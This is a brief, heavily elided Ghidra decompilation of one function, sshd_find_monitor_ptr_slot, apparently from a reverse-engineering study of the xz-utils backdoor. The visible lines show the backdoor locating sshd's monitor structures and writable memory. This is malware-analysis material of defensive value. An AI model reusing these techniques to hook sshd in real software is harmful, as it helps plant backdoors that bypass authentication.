// /home/kali/xzre-ghidra/xzregh/103DB0_sshd_find_monitor_ptr_slot.c
// Function: sshd_find_monitor_ptr_slot @ 0x103DB0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_monitor_ptr_slot(elf_info_t * elf, string_references_t * refs, global_context_t * ctx)
...
BOOL sshd_find_monitor_ptr_slot(elf_info_t *elf,string_references_t *refs,global_context_t *ctx)

{
  ...
  secret_append_ok = secret_data_append_bits_from_call_site((secret_data_shift_cursor_t)0xda,0x14,0xf,FALSE);
  ...
  if ((secret_append_ok != FALSE) && (data_segment_size = 0, ctx->sshd_ctx->mm_request_send_start != (void *)0x0)) {
    ...
    data_start = (u8 *)elf_get_writable_tail_span(elf,&data_segment_size,FALSE);
